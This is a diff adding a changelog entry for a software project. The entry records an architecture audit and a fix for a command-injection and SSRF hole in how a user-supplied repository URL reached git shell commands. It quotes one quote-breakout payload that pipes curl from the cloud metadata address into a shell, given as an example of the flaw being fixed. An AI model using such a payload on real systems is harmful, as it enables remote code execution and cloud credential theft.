@@ -7142,3 +7142,36 @@ Tests: +8 (`liveEventsAllowedFor` all four quadrants incl. the ghost-doc conserv
 in-memory channel path: workspace stamp round-trip, close-leaves-no-tail, close-discards-pending,
 cursor-past-seq returns nothing). Gate: frontend tsc 0, server tsc 0, vitest 4156/4156 PASS,
 boot:check PASS.
+
+## 2026-07-02 — v3.0 Lead-Architect program: full audit + Sec-1 (C2 importUrl host-RCE) shipped
+
+Admin commissioned a Lead-Architect-level transformation of Pro v3.0 (audit + root-cause + redesign),
+scoped to "edit only v3.0", and approved: fix security C1–C4 first, then the redesign in sequence.
+
+Delivered a prioritized v3.0 architecture audit (P0–P3) + E2B root-cause verdict. Key verified finding:
+the custom E2B template (`navbharat-builder`) is built in infra/ but NEVER wired — `E2BActuator._opts()`
+passes no `template`, so every sandbox runs E2B's DEFAULT base image (this, not E2B itself, is the core
+"E2B unreliable" cause). Verdict: keep E2B, wire the template + add a prod sandbox guard + make the
+in-browser renderer the deterministic default preview; evaluate alternatives only if it stays bad after.
+
+**Sec-1 (this commit) — C2: host command-injection + SSRF via `importUrl`.** Root cause: user `importUrl`
+was interpolated raw into `git clone "${url}"` / `git push "${url}"` shell strings run by the actuator —
+the HOST process when `E2B_API_KEY` is unset (LocalActuator fallback). A quote-breakout payload
+(`…/r"; curl 169.254.169.254 | sh; echo "`) = host RCE + cloud-metadata read; a `file://`/internal-IP URL
+= SSRF. Fix: new pure `sanitizeRepoUrl()` in `GitRepoSync.ts` PARSES the URL and REBUILDS it from
+validated components — only `https://[token@|x-access-token:token@]github.com/owner/repo[.git]` survives;
+the rebuilt string contains only `[A-Za-z0-9_.:@/-]`, none of which can escape a double-quoted shell arg.
+Applied at BOTH sinks (clone + push) and again at the route (clear message + never splices a token into a
+bad URL). The CommandRunner port is string-command-only across all three actuators, so validate-and-rebuild
+at the sink is the complete fix for this interface (argv-spawn noted as a deeper future option).
+
+Self-review caught (and fixed pre-gate) that the first draft wrongly rejected the legit GitHub-App
+`x-access-token:TOKEN@` auth form — which would have broken push. Tests: +9 (injection payload, SSRF/
+non-github/scheme/look-alike-host/port/ssh, path-segment count, both legit token forms round-trip, and the
+sink refusing an unsafe URL before any shell call). Gate: frontend tsc 0, server tsc 0, vitest 4165/4165
+PASS, boot:check PASS.
+
+Queued next (approved order, v3.0-scoped): C3 (preview-iframe origin isolation) → C1 (verified identity
+across the build path = architecture item A1) → Phase 3 redesign (A3 wire E2B template → A2 prod guard →
+A4/A6 unified preview + build state machine → A8 resumable manifest generation → export verification).
+Out-of-v3.0-scope, flagged for separate go-ahead: C4/payments, sync.ts, wallet.ts, team-RBAC.
